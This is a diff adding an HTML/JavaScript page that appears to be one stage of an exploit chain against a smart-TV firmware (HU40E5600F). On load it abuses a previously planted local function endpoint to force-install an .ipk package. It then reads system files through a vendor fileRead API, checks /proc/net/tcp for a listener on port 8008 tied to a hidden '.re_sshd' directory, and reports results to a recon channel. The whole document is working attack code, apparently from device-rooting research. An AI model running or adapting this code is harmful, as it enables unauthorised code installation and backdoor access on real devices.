@@ -1,0 +1,69 @@
+<!doctype html>
+<!-- Phase C2 for HU40E5600F (09.09K): trigger superwatch install (id 53) of
+     /APPS/installer.ipk via the planted sw2.js FaaS function, then verify by
+     reading /APPS/.re_sshd/installer_log.txt (source of truth) and return to
+     recon.html so the live channel comes back. -->
+<html><head><meta charset="utf-8"><title>trigger-53</title></head>
+<body style="background:#111;color:#0f0;font:20px monospace"><pre id="o">trigger…</pre>
+<script>
+(function () {
+  "use strict";
+  var O = document.getElementById('o');
+  function log(m) { O.textContent += "\n" + m; return m; }
+  function post(t) {
+    try {
+      var x = new XMLHttpRequest();
+      x.open("POST", "/api/recon", false);
+      x.setRequestHeader("Content-Type", "text/plain");
+      x.send("TRIGGER53\n" + t);
+    } catch (e) {}
+  }
+  function raw(path) {
+    try {
+      var r = HiUtils_createRequest("fileRead", { path: path, mode: 6 });
+      var msg = r.msg;
+      if (msg != null && typeof msg === "object") msg = JSON.stringify(msg);
+      return { ret: r.ret, msg: String(msg == null ? "" : msg) };
+    } catch (e) { return { exception: String(e) }; }
+  }
+  var SID = 77;
+  var CMD = SID + ":53:" + SID + ";/APPS/installer.ipk;re.installer;";
+  setTimeout(function () {
+    var res = [];
+    try {
+      var x = new XMLHttpRequest();
+      x.open("POST", "https://localhost:9888/function/basic/fetch/sw2", false);
+      x.setRequestHeader("identifier", "");
+      x.send(JSON.stringify({ list: [CMD] }));
+      res.push("sw2 -> " + String(x.responseText || "").slice(0, 400));
+    } catch (e) { res.push("EXC " + e.name + ": " + e.message); }
+    post(res.join("\n"));
+    log(res.join("\n"));
+    // opkg takes a few seconds; poll the installer log up to ~30s
+    var tries = 0;
+    var iv = setInterval(function () {
+      tries++;
+      var chk = raw("../APPS/.re_sshd/installer_log.txt");
+      if (chk.ret === true) {
+        clearInterval(iv);
+        res.push("installer_log (try " + tries + "):\n" + chk.msg.slice(0, 3000));
+        var tcp = raw("../proc/net/tcp");
+        res.push("port 8008 LISTEN: " + (tcp.ret === true && tcp.msg.indexOf(":1F48") !== -1));
+        post(res.join("\n"));
+        log(res.slice(-2).join("\n"));
+        post(res.join("\n") + "\nRETURNING-TO-RECON");
+        setTimeout(function () { location.href = "recon.html"; }, 3000);
+      } else if (tries >= 10) {
+        clearInterval(iv);
+        var rr = raw("../tmp/ipk_install_result");
+        res.push("installer_log still absent after 30s; ipk_install_result: ret=" + rr.ret + " " + String(rr.msg).slice(0, 400));
+        post(res.join("\n"));
+        log(res.slice(-1)[0]);
+        setTimeout(function () { location.href = "recon.html"; }, 3000);
+      } else {
+        log("waiting for installer_log… (try " + tries + ")");
+      }
+    }, 3000);
+  }, 1500);
+})();
+</script></body></html>
